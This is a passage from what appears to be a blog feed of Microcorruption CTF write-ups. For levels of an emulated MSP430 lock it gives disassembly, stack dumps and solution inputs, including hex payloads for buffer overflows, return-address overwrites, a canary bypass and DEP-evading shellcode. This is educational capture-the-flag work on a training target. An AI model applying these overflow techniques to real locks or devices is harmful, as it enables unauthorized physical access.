<p>This level introduces <a href="http://en.wikipedia.org/wiki/Data_Execution_Prevention">DEP</a>, in which some of the memory pages (<code>0x100</code> bytes segments in our case) are executable and some are writable, but not both. Thus, writing a shellcode to the stack is OK, but it&rsquo;s no executable.</p>

<p>Since the stack is on the boundary between pages <code>0x3f</code> and <code>0x40</code> it&rsquo;s possible to write our shellcode into <code>0x40</code> while it&rsquo;s still writable, but in a way that when <code>login</code> returns it will mark it as executable. The shellcode is very similar to the previous ones, so I&rsquo;ll just write the password here: <code>0x61616161616161616161616161616161be44000000000000400000000c4031800f00324000ffb0121000</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Microcorruption CTF - Part I]]></title>
    <link href="http://idosch.github.io/blog/2014/04/18/microcorruption-ctf-part-i/"/>
    <updated>2014-04-18T23:29:17+03:00</updated>
    <id>http://idosch.github.io/blog/2014/04/18/microcorruption-ctf-part-i</id>
    <content type="html"><![CDATA[<h2>Introduction</h2>

<p><a href="https://microcorruption.com">Microcorruption CTF</a> (or uctf) is a security challenge in which you are given an electronic lock (Lockit all LockIT Pro) based on the <a href="http://en.wikipedia.org/wiki/TI_MSP430">TI MSP430</a> microcontroller and a debugger connected to it. The objective is to find inputs that will unlock the device in order to allow access to your operatives scattered around the world into different warehouses. The device even has his own bogus <a href="https://microcorruption.com/manual.pdf">manual</a> which is a must read.</p>

<p>In this post I will write and explain my solutions to the various levels of the challenge. Please note that I did not try to optimize my solutions &ndash; that is, there are solutions with shorter input and which use less CPU cycles. In the future I might update this post with more elegant solutions.</p>

<h2>Level 1: New Orleans</h2>

<p>The interesting part is the <code>check_password</code> subroutine located at 0x44bc:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>44bc &lt;check_password&gt;
</span><span class='line'>44bc:  0e43           clr   r14
</span><span class='line'>44be:  0d4f           mov   r15, r13
</span><span class='line'>44c0:  0d5e           add   r14, r13
</span><span class='line'>44c2:  ee9d 0024      cmp.b @r13, 0x2400(r14)
</span><span class='line'>44c6:  0520           jne   #0x44d2 &lt;check_password+0x16&gt;
</span><span class='line'>44c8:  1e53           inc   r14
</span><span class='line'>44ca:  3e92           cmp   #0x8, r14
</span><span class='line'>44cc:  f823           jne   #0x44be &lt;check_password+0x2&gt;
</span><span class='line'>44ce:  1f43           mov   #0x1, r15
</span><span class='line'>44d0:  3041           ret
</span><span class='line'>44d2:  0f43           clr   r15
</span><span class='line'>44d4:  3041           ret</span></code></pre></td></tr></table></div></figure>


<p>Lines 0x44be through 0x44cc form a loop which is executed eight times, at each iteration checking whether the byte in memory location pointed to by <code>r13</code> (your password) is in accordance with the authorized password (at memory location <code>0x2400+r14</code>). Therefore, the password is <code>?qa0+]P</code>.</p>

<h2>Level 2: Sydney</h2>

<p>As in the previous level, the interesting part here is also the <code>check_password</code> subroutine:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>448a &lt;check_password&gt;
</span><span class='line'>448a:  bf90 435d 0000 cmp   #0x5d43, 0x0(r15)
</span><span class='line'>4490:  0d20           jnz   $+0x1c
</span><span class='line'>4492:  bf90 3f53 0200 cmp   #0x533f, 0x2(r15)
</span><span class='line'>4498:  0920           jnz   $+0x14
</span><span class='line'>449a:  bf90 5f3e 0400 cmp   #0x3e5f, 0x4(r15)
</span><span class='line'>44a0:  0520           jne   #0x44ac &lt;check_password+0x22&gt;
</span><span class='line'>44a2:  1e43           mov   #0x1, r14
</span><span class='line'>44a4:  bf90 4241 0600 cmp   #0x4142, 0x6(r15)
</span><span class='line'>44aa:  0124           jeq   #0x44ae &lt;check_password+0x24&gt;
</span><span class='line'>44ac:  0e43           clr   r14
</span><span class='line'>44ae:  0f4e           mov   r14, r15
</span><span class='line'>44b0:  3041           ret</span></code></pre></td></tr></table></div></figure>


<p>A pointer to the entered password is passed to the subroutine via <code>r15</code>. Each of the four <code>cmp</code> instructions checks whether the two bytes pointed to by <code>r15</code> plus the offset are valid. Notice that here &ndash; unlike in the previous level &ndash; the <code>cmp</code> instruction is used and not <code>cmp.b</code>. The word size in the MSP430 is 16 bits and therefore the instructions operate on two bytes of data unless specifically told to do otherwise (by using a <code>.b</code> suffix).</p>

<p>Since the MSP430 is <a href="http://en.wikipedia.org/wiki/Endianness">little-endian</a> multi-byte values are stored in memory in reverse order. Thus, the password is <code>0x435d3f535f3e4241</code>.</p>

<h2>Level 3: Hanoi</h2>

<p>Instead of of using the lock itself to test the entered password, here Hardware Security Module 1 (HSM 1) is used. Using the interrupt <code>0x7d</code> (refer to the user manual for more details) the microcontroller can test if the entered password is valid. Therefore, unlike previous levels, in this level it is not possible to extract the password from the given code. Looking at the <code>login</code> subroutine we can see that the following happens:</p>

<ol>
<li><code>getsn</code> is used to retrieve a password of length up to <code>0x1c</code> bytes from the user into memory starting at address <code>0x2400</code>.</li>
<li><code>test_password_valid</code> is called with address <code>0x2400</code> as an argument.</li>
<li>Access is granted by calling <code>unlock_door</code> if address <code>0x2410</code> stores the value <code>0x2d</code>.</li>
</ol>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>4520 &lt;login&gt;
</span><span class='line'>4520:  c243 1024      mov.b #0x0, &0x2410
</span><span class='line'>4524:  3f40 7e44      mov   #0x447e "Enter the password to continue.", r15
</span><span class='line'>4528:  b012 de45      call  #0x45de &lt;puts&gt;
</span><span class='line'>452c:  3f40 9e44      mov   #0x449e "Remember: passwords are between 8 and 16 characters.", r15
</span><span class='line'>4530:  b012 de45      call  #0x45de &lt;puts&gt;
</span><span class='line'>4534:  3e40 1c00      mov   #0x1c, r14
</span><span class='line'>4538:  3f40 0024      mov   #0x2400, r15
</span><span class='line'>453c:  b012 ce45      call  #0x45ce &lt;getsn&gt;
</span><span class='line'>4540:  3f40 0024      mov   #0x2400, r15
</span><span class='line'>4544:  b012 5444      call  #0x4454 &lt;test_password_valid&gt;
</span><span class='line'>4548:  0f93           tst   r15
</span><span class='line'>454a:  0324           jz    $+0x8
</span><span class='line'>454c:  f240 d400 1024 mov.b #0xd4, &0x2410
</span><span class='line'>4552:  3f40 d344      mov   #0x44d3 "Testing if password is valid.", r15
</span><span class='line'>4556:  b012 de45      call  #0x45de &lt;puts&gt;
</span><span class='line'>455a:  f290 2d00 1024 cmp.b #0x2d, &0x2410
</span><span class='line'>4560:  0720           jne   #0x4570 &lt;login+0x50&gt;
</span><span class='line'>4562:  3f40 f144      mov   #0x44f1 "Access granted.", r15
</span><span class='line'>4566:  b012 de45      call  #0x45de &lt;puts&gt;
</span><span class='line'>456a:  b012 4844      call  #0x4448 &lt;unlock_door&gt;
</span><span class='line'>456e:  3041           ret
</span><span class='line'>4570:  3f40 0145      mov   #0x4501 "That password is not correct.", r15
</span><span class='line'>4574:  b012 de45      call  #0x45de &lt;puts&gt;
</span><span class='line'>4578:  3041           ret</span></code></pre></td></tr></table></div></figure>


<p>Although the user is prompt to enter a password of up to 16 bytes there is no input checking. Therefore, by entering a 17 chars password with the last one set to <code>0x2d</code> it is possible to overwrite memory address <code>0x2410</code> and trick the program. A good password is thus: <code>0x414141414141414141414141414141412d</code>.</p>

<h2>Level 4: Cusco</h2>

<p>This one is a classic <a href="http://en.wikipedia.org/wiki/Stack_buffer_overflow">stack smashing</a> level. I won&rsquo;t get into the whole &ldquo;how the stack works&rdquo; since there are <a href="http://duartes.org/gustavo/blog/post/journey-to-the-stack/">great</a> <a href="http://duartes.org/gustavo/blog/post/epilogues-canaries-buffer-overflows/">resources</a> covering it already, but only explain the general idea bellow. The <code>login</code> subroutine does the following:</p>

<ol>
<li>Read up to <code>0x30</code> chars from the user into the stack.</li>
<li>Test whether the entered password is valid by sending the password location as an argument to <code>test_password_valid</code>.</li>
<li>Unlock the door via <code>unlock_door</code> if the password is valid.</li>
</ol>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>4500 &lt;login&gt;
</span><span class='line'>4500:  3150 f0ff      add   #0xfff0, sp
</span><span class='line'>4504:  3f40 7c44      mov   #0x447c "Enter the password to continue.", r15
</span><span class='line'>4508:  b012 a645      call  #0x45a6 &lt;puts&gt;
</span><span class='line'>450c:  3f40 9c44      mov   #0x449c "Remember: passwords are between 8 and 16 characters.", r15
</span><span class='line'>4510:  b012 a645      call  #0x45a6 &lt;puts&gt;
</span><span class='line'>4514:  3e40 3000      mov   #0x30, r14
</span><span class='line'>4518:  0f41           mov   sp, r15
</span><span class='line'>451a:  b012 9645      call  #0x4596 &lt;getsn&gt;
</span><span class='line'>451e:  0f41           mov   sp, r15
</span><span class='line'>4520:  b012 5244      call  #0x4452 &lt;test_password_valid&gt;
</span><span class='line'>4524:  0f93           tst   r15
</span><span class='line'>4526:  0524           jz    #0x4532 &lt;login+0x32&gt;
</span><span class='line'>4528:  b012 4644      call  #0x4446 &lt;unlock_door&gt;
</span><span class='line'>452c:  3f40 d144      mov   #0x44d1 "Access granted.", r15
</span><span class='line'>4530:  023c           jmp   #0x4536 &lt;login+0x36&gt;
</span><span class='line'>4532:  3f40 e144      mov   #0x44e1 "That password is not correct.", r15
</span><span class='line'>4536:  b012 a645      call  #0x45a6 &lt;puts&gt;
</span><span class='line'>453a:  3150 1000      add   #0x10, sp
</span><span class='line'>453e:  3041           ret</span></code></pre></td></tr></table></div></figure>


<p>The user is prompt to enter a password between 8 and 16 chars (although, as you have probably noticed, it is not forced). Entering <code>idosch1234</code>, putting a breakpoint at <code>0x453e</code> (just before <code>login</code> returns) and examining the stack we see the following (the stack pointer points to <code>0x43fe</code>):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>break 453e</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>43d0:   0000 0000 0000 0000 0000 0000 5645 0100   ............VE..
</span><span class='line'>43e0:   5645 0300 ca45 0000 0a00 0000 3a45 6964   VE...E......:Eid
</span><span class='line'>43f0:   6f73 6368 3132 3334 0000 0000 0000 3c44   osch1234.......D</span></code></pre></td></tr></table></div></figure>


<p>Visible are:</p>

<ol>
<li>Leftovers from previous <a href="http://en.wikipedia.org/wiki/Call_stack">stack frames</a> (in lower addresses).</li>
<li>The entered password in the current stack frame and the address to return to after the <code>login</code> subroutine ends: <code>0x443c</code>.</li>
</ol>


<p>By entering a 18 bytes password we can effectively take control of the program execution and make it return to wherever we want. A good place is the <code>unlock_door</code> subroutine located at memory address <code>0x4446</code>. Entering the password <code>0x414141414141414141414141414141414644</code> does the trick.</p>

<h2>Level 5: Reykjavik</h2>

<p>At first this level seems very weird as there are no calls to the usual I/O subroutines <code>getsn</code> and <code>puts</code>. However, looking at <code>main</code>, we see a call to a subroutine starting at address <code>0x2400</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>4438 &lt;main&gt;
</span><span class='line'>4438:  3e40 2045      mov   #0x4520, r14
</span><span class='line'>443c:  0f4e           mov   r14, r15
</span><span class='line'>443e:  3e40 f800      mov   #0xf8, r14
</span><span class='line'>4442:  3f40 0024      mov   #0x2400, r15
</span><span class='line'>4446:  b012 8644      call  #0x4486 &lt;enc&gt;
</span><span class='line'>444a:  b012 0024      call  #0x2400
</span><span class='line'>444e:  0f43           clr   r15</span></code></pre></td></tr></table></div></figure>


<p>Using the disassembler the following code reveals itself:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>push r11
</span><span class='line'>push r4
</span><span class='line'>mov  sp, r4
</span><span class='line'>add  #0x4, r4
</span><span class='line'>add  #0xffe0, sp
</span><span class='line'>mov  #0x4520, r11
</span><span class='line'>jmp  $+0x10
</span><span class='line'>inc  r11
</span><span class='line'>sxt  r15
</span><span class='line'>push r15
</span><span class='line'>push #0x0
</span><span class='line'>call #0x2464
</span><span class='line'>add  #0x4, sp
</span><span class='line'>mov.b    @r11, r15
</span><span class='line'>tst.b    r15
</span><span class='line'>jnz  $-0x12
</span><span class='line'>push #0xa
</span><span class='line'>push #0x0
</span><span class='line'>call #0x2464
</span><span class='line'>add  #0x4, sp
</span><span class='line'>push #0x1f
</span><span class='line'>mov  #0xffdc, r15
</span><span class='line'>add  r4, r15
</span><span class='line'>push r15
</span><span class='line'>push #0x2
</span><span class='line'>call #0x2464
</span><span class='line'>add  #0x6, sp
</span><span class='line'>cmp  #0xadf2, -0x24(r4)
</span><span class='line'>jnz  $+0xc
</span><span class='line'>push #0x7f
</span><span class='line'>call #0x2464
</span><span class='line'>incd sp
</span><span class='line'>add  #0x20, sp
</span><span class='line'>pop  r4
</span><span class='line'>pop  r11
</span><span class='line'>ret
</span><span class='line'>mov  0x2(sp), r14
</span><span class='line'>push sr
</span><span class='line'>mov  r14, r15
</span><span class='line'>swpb r15
</span><span class='line'>mov  r15, sr
</span><span class='line'>bis  #0x8000, sr
</span><span class='line'>call #0x10
</span><span class='line'>pop  sr
</span><span class='line'>ret
</span><span class='line'>call &0x9a18
</span><span class='line'>bis  @r12, sr
</span><span class='line'>bit.b    r9, r5
</span><span class='line'>subc.b   r9, sr
</span><span class='line'>add  @r5, r13
</span><span class='line'>sub  r14, -0x5d5c(r5)
</span><span class='line'>bis.b    @r7, r7
</span><span class='line'>dadd 0x19a1(r14), r4
</span><span class='line'>and.b    @r6+, r6
</span><span class='line'>bic.b    r11, sr
</span><span class='line'>rrc  -0x5f2(r12)
</span><span class='line'>invalid  @r6
</span><span class='line'>dadd.b   @r7+, r4
</span><span class='line'>addc.b   r11, sp
</span><span class='line'>jge  $-0x5a
</span><span class='line'>incd &0xe422
</span><span class='line'>dadd.b   @r15, r6
</span><span class='line'>dadd.b   r5, -0x746d(sp)
</span><span class='line'>subc sp, -0x7765(r9)
</span><span class='line'>cmp.b    @r11+, 0x7466(r10)
</span><span class='line'>jnz  $+0x29e
</span><span class='line'>addc @r11, r10
</span><span class='line'>mov  #-0x1, 0x5191(sp)
</span><span class='line'>bic  @r12+, r13
</span><span class='line'>and  @r5, -0x5826(r6)
</span><span class='line'>jmp  $-0x48
</span><span class='line'>jmp  $+0x11c
</span><span class='line'>rrc.b    r13
</span><span class='line'>jge  $-0x370
</span><span class='line'>dadd.b   -0x65bb(r6), 0x6124(r15)
</span><span class='line'>sxt  &0x9132
</span><span class='line'>xor  0x5781(r6), r4
</span><span class='line'>and  @r14+, -0x22d3(pc)
</span><span class='line'>reti pc
</span><span class='line'>sub  r8, 0x1063(r6)
</span><span class='line'>bit  #-0x1, r10
</span><span class='line'>jnc  $-0x13c
</span><span class='line'>bis  r9, r11
</span><span class='line'>jmp  $-0x16e
</span><span class='line'>rrc.b    r14
</span><span class='line'>subc.b   0x384c(pc), r8
</span><span class='line'>jmp  $+0x194
</span><span class='line'>jge  $-0x200
</span><span class='line'>rra  r14
</span><span class='line'>jmp  $-0x300
</span><span class='line'>add.b    @r5+, -0x1052(r10)
</span><span class='line'>rrc  r5
</span><span class='line'>jc   $+0x4a
</span><span class='line'>add  @r6+, r12
</span><span class='line'>dadd 0x7be5(r15), 4
</span><span class='line'>bit  r15, 0x4030(r10)
</span><span class='line'>jge  $-0x74
</span><span class='line'>addc.b   @r14, r5
</span><span class='line'>subc r8, &0xf99a
</span><span class='line'>call -0x7c42(r13)
</span><span class='line'>sub  @r12+, 8
</span><span class='line'>bis  @r8+, r10
</span><span class='line'>add  @r10+, r9
</span><span class='line'>xor.b    #-0x1, 0x34f(r12)
</span><span class='line'>bic  r9, -0x6a6d(r14)
</span><span class='line'>rra.b    r10
</span><span class='line'>jl   $-0x62
</span><span class='line'>call @r13+
</span><span class='line'>subc.b   @r9+, r7
</span><span class='line'>bic.b    #0x0, -0xda1(r9)
</span><span class='line'>bic  @r7+, r13
</span><span class='line'>add.b    #0x1, r9
</span><span class='line'>jz   $-0x2ee
</span><span class='line'>bit.b    -0x727(r5), -0x619d(pc)
</span><span class='line'>subc.b   @pc, -0x32ff(r9)
</span><span class='line'>rra  @sp
</span><span class='line'>addc.b   r10, 0x2cd1(r10)
</span><span class='line'>xor  &0x3875, -0x3a6a(r7)
</span><span class='line'>jnc  $+0x120
</span><span class='line'>sub.b    &0xe51b, 0x20ab(r6)
</span><span class='line'>sub.b    @r9+, 4
</span><span class='line'>dadd.b   r10, r8
</span><span class='line'>dinc r15
</span><span class='line'>jc   $-0x170
</span><span class='line'>addc @r4, 0x2dde(r5)
</span><span class='line'>swpb @r7+
</span><span class='line'>sub  0x552(sp), 0x448d(pc)
</span><span class='line'>and.b    r4, 0x2ebc(r15)
</span><span class='line'>subc.b   -0xb2b(r10), r7
</span><span class='line'>add  @sp, 0x43c2(r8)
</span><span class='line'>subc @r13, r7
</span><span class='line'>bic  @r10, 0x6b1e(r4)</span></code></pre></td></tr></table></div></figure>


<p>This is quite a clusterfuck, but pretty quickly it becomes evident that the <code>INT</code> subroutine (the one used to interface with the HSMs and the deadbolt) is at <code>0x2464</code> (line 37). The interesting part is at <code>0x2450</code> (line 31) where the <code>INT</code> subroutine is called with <code>0x7F</code> as an argument:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'>cmp  #0xadf2, -0x24(r4)
</span><span class='line'>jnz  $+0xc
</span><span class='line'>push #0x7f
</span><span class='line'>call #0x2464
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Looking at the user manual one can see that this interrupt is used to interface with the deadbolt and trigger an unlock. In order to reach this line the value at memory location <code>@r4-0x24</code> needs to be <code>f2ad</code>. Using the debugger, this memory location turns out to be the start of the entered password. Therefore, the password is: <code>0xf2ad</code>.</p>

<h2>Level 6: Johannesburg</h2>

<p>As with previous levels, we begin our journey with the <code>login</code> subroutine:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>452c &lt;login&gt;
</span><span class='line'>452c:  3150 eeff      add   #0xffee, sp
</span><span class='line'>4530:  f140 a600 1100 mov.b #0xa6, 0x11(sp)
</span><span class='line'>4536:  3f40 7c44      mov   #0x447c "Enter the password to continue.", r15
</span><span class='line'>453a:  b012 f845      call  #0x45f8 &lt;puts&gt;
</span><span class='line'>453e:  3f40 9c44      mov   #0x449c "Remember: passwords are between 8 and 16 characters.", r15
</span><span class='line'>4542:  b012 f845      call  #0x45f8 &lt;puts&gt;
</span><span class='line'>4546:  3e40 3f00      mov   #0x3f, r14
</span><span class='line'>454a:  3f40 0024      mov   #0x2400, r15
</span><span class='line'>454e:  b012 e845      call  #0x45e8 &lt;getsn&gt;
</span><span class='line'>4552:  3e40 0024      mov   #0x2400, r14
</span><span class='line'>4556:  0f41           mov   sp, r15
</span><span class='line'>4558:  b012 2446      call  #0x4624 &lt;strcpy&gt;
</span><span class='line'>455c:  0f41           mov   sp, r15
</span><span class='line'>455e:  b012 5244      call  #0x4452 &lt;test_password_valid&gt;
</span><span class='line'>4562:  0f93           tst   r15
</span><span class='line'>4564:  0524           jz    #0x4570 &lt;login+0x44&gt;
</span><span class='line'>4566:  b012 4644      call  #0x4446 &lt;unlock_door&gt;
</span><span class='line'>456a:  3f40 d144      mov   #0x44d1 "Access granted.", r15
</span><span class='line'>456e:  023c           jmp   #0x4574 &lt;login+0x48&gt;
</span><span class='line'>4570:  3f40 e144      mov   #0x44e1 "That password is not correct.", r15
</span><span class='line'>4574:  b012 f845      call  #0x45f8 &lt;puts&gt;
</span><span class='line'>4578:  f190 a600 1100 cmp.b #0xa6, 0x11(sp)
</span><span class='line'>457e:  0624           jeq   #0x458c &lt;login+0x60&gt;
</span><span class='line'>4580:  3f40 ff44      mov   #0x44ff "Invalid Password Length: password too long.", r15
</span><span class='line'>4584:  b012 f845      call  #0x45f8 &lt;puts&gt;
</span><span class='line'>4588:  3040 3c44      br    #0x443c &lt;__stop_progExec__&gt;
</span><span class='line'>458c:  3150 1200      add   #0x12, sp
</span><span class='line'>4590:  3041           ret</span></code></pre></td></tr></table></div></figure>


<p>This is very similar to Cusco, the difference being that the developers &ldquo;improved the security of the lock by ensuring passwords that are too long will be rejected&rdquo;. This is implemented in <code>0x4578</code>, where the value saved in the stack 18 bytes after our password starts is verified to be <code>0xa6</code>, therefore allowing us to enter no more than 17 chars. The concept is similar to <a href="http://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries">stack canaries</a>, the difference being that true stack canaries are random and thus can not be so easily exploited. The stack with entered password <code>idosch1234</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>43d0:   0000 0000 0000 0000 0000 a845 0100 a845   ...........E...E
</span><span class='line'>43e0:   0300 1c46 0000 0a00 0000 7845 6964 6f73   ...F......xEidos
</span><span class='line'>43f0:   6368 3132 3334 0000 0000 0000 00a6 3c44   ch1234........&gt;D</span></code></pre></td></tr></table></div></figure>


<p>Visible are the password, the stack canary at <code>0x43fd</code> and the saved PC (<code>0x443c</code>). Since the program reads up to <code>0x3f</code> bytes from the user it very easy to bypass this protection. We simply enter 17 bytes, then the canary (<code>0xa6</code>) and then whichever address we want to make the program return to (to <code>unlock_door</code>, obviously). The password: <code>0x4141414141414141414141414141414141a64644</code> is a good choice.</p>

<h2>Level 7: Whitehorse</h2>

<p>Up until now only the HSM 1 was employed. However, in this level the HSM 2 is introduced. Unlike the HSM 1, this model can check if a password is correct and then initiate itself an unlock. Therefore, no <code>unlock_door</code> subroutine is available to us to return to. On the other hand, remembering that this subroutine did nothing more than call the <code>INT</code> subroutine with <code>0x7f</code> as argument, we can reproduce it.</p>

<p>The <code>INT</code> subroutine takes one argument, which is passed to it via the stack (and not using a register). Since in the MSP430 the stack grows towards lower addresses we can simply smash the stack as before and change the return address to that of an instruction calling <code>INT</code>. As opposed to other levels, here we also add the argument we want to send to <code>INT</code> after the new return address. Entering <code>0x6161616161616161616161616161616154457f</code> does just that.</p>

<h2>Level 8: Montevideo</h2>

<p>This level is exactly like the previous one (Whitehorse). In the overview it is mentioned that the developers changed the code to &ldquo;conform to the internal secure development process&rdquo;. This statement is supported by the code, since now the user&rsquo;s password is overwritten using <code>memset</code> after it is checked.</p>

